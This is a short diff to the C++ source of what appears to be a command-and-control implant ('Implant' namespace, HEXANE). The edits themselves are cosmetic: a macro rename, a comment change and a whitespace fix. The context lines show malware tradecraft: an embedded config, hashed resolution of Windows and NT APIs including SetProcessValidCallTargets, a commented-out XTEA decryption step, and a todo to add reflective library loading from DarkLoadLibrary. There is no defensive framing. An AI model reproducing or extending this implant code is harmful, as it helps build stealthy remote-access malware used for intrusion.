@@ -1,8 +1,8 @@
 #include <core/include/implant.hpp>
-// todo: define CFG_LEN macro
+// todo: define CFG_SIZE macro
 
 namespace Implant {
-    __text(F) uint8_t _config[CFG_LEN] = { "AAAAAAAA", };
+    __text(F) uint8_t _config[CFG_SIZE] = { "AAAAAAAA", };
 
     VOID MainRoutine() {
         HEXANE
@@ -146,7 +146,7 @@ namespace Implant {
         Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
 
         //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
-        // todo: add reflective library loading: https://github.com/bats3c/DarkLoadLibrary
+        // todo: add ReflectLoadLibrary: https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
             x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
@@ -159,7 +159,7 @@ namespace Implant {
             success_(false);
         }
 
-        x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS)) ;
+        x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
         x_assertb(F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY));
         x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST));
         x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListNext,                  Ctx->modules.kernel32, HEAP32LISTNEXT));
